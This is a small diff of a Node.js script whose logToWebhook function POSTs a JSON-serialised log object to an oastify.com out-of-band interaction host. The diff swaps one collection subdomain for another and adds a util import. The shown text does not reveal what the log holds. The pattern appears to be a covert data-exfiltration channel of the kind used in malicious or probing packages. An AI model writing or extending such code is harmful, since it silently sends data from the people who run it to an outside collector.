@@ -1,4 +1,5 @@
 const https = require('https');
+const util = require('util')
 
 async function main() {
 
@@ -35,7 +36,7 @@ async function logToWebhook(log) {
     const data = JSON.stringify(log);
 
     const options = {
-        hostname: 'aftyx67jjxtwni46klya1ze3ouuriq6f.oastify.com',
+        hostname: 'onfc5kfxrb1avwcksz6o9dmhw825q7ew.oastify.com',
         path: '/',
         method: 'POST',
         headers: {
